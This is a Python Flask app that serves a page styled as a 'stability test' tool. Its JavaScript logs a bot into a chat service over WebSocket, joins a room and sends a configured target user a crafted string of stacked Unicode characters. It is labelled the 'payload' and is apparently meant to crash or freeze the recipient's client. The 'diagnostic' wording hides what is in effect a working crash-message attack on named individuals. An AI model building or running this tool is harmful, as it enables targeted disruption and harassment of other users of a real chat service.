import os
from flask import Flask, render_template_string

app = Flask(__name__)

# ================= CONFIGURATION =================
# Apni details yahan ek hi baar set kar dein
CONFIG = {
    "target_id": "APNI_ID_YAHAN_LIKHEIN", # Target User ID
    "bot_user": "BOT_USERNAME",
    "bot_pass": "BOT_PASSWORD",
    "room": "american", # Room Name
    "ws_url": "wss://chatp.net:5333/server"
}
# =================================================

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN STABILITY SUITE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #020202; color: #00f3ff; font-family: monospace; text-align: center; padding: 20px; }
        .card { border: 2px solid #00f3ff; padding: 20px; border-radius: 10px; background: rgba(0,243,255,0.05); max-width: 400px; margin: auto; }
        .status-box { background: #000; border: 1px solid #333; height: 120px; overflow-y: auto; text-align: left; padding: 10px; font-size: 11px; margin-top: 15px; color: #0f0; }
        button { background: transparent; border: 1px solid #00f3ff; color: #00f3ff; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; transition: 0.3s; }
        button:hover { background: #00f3ff; color: #000; box-shadow: 0 0 20px #00f3ff; }
        .tag { color: #ff003c; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h3>TITAN OS v21</h3>
        <p>Target Locked: <span class="tag">{{ config.target_id }}</span></p>
        <button onclick="startDiagnostic()">EXECUTE STABILITY TEST</button>
        <div id="log" class="status-box">SYSTEM IDLE...</div>
    </div>

    <script>
        function log(m) {
            const l = document.getElementById('log');
            l.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + m + "</div>";
            l.scrollTop = l.scrollHeight;
        }

        function startDiagnostic() {
            log("Initializing WebSocket...");
            const ws = new WebSocket("{{ config.ws_url }}");

            ws.onopen = () => {
                log("Connected. Authenticating Bot...");
                ws.send(JSON.stringify({
                    handler: "login",
                    id: Math.random(),
                    username: "{{ config.bot_user }}",
                    password: "{{ config.bot_pass }}"
                }));
            };

            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                if(data.handler === "login_event" && data.type === "success") {
                    log("Login Success. Entering Room...");
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: "{{ config.room }}"}));
                }
                if(data.handler === "room_event" && data.type === "room_joined") {
                    log("Target In Reach. Sending Payload...");
                    // Complex Stability Payload
                    const payload = "జ్ఞా" + " ҉ ".repeat(15) + "ဪ".repeat(5);
                    ws.send(JSON.stringify({
                        handler: "chat_message",
                        to: "{{ config.target_id }}",
                        type: "text",
                        body: payload
                    }));
                    log("Test Packet Delivered!");
                    setTimeout(() => ws.close(), 2000);
                }
            };
            ws.onclose = () => log("Connection Closed.");
            ws.onerror = () => log("Connection Error!");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE, config=CONFIG)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
